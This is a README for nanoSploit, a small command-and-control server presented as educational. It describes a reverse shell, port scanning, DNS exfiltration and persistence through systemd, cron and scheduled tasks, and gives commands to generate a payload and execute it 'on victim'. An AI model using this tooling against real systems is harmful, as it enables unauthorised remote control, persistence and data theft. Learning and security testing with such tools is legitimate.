# nanoSploit

Minimalist C2 server for educational purpose.

## Features

### Principals

- Encrypted reverse shell
  - With `cd` support
- Port scanner
  - Single host and network scan
  - Banner grabbing
- DNS ex-filtration
  - Used for download/upload
- Persistence
  - Linux :
    - Systemd service -> every 3 seconds
    - Crontab -> every minute
  - Windows -> Scheduled task -> every minute

### Bonus

- Multi-session
  - Metasploit-like
- Upload/download files
  - Using DNS ex-filtration
- Cross-platform
- No external modules in payload (no need to `pip install` something)

## Install

With pip:
```shell
pip install git+https://github.com/nanosploit/nanosploit.git
```

## Usage

### Server

Run the program terminal :
```shell
python -m nanosploit
```

### Client

Export a payload to execute on victim :
```shell
python -m nanosploit generate --path payload --host 127.0.0.1 --port 5353
./payload # Execute on remote machine
```

Run the program for debugging :
```shell
python -m nanosploit client
```
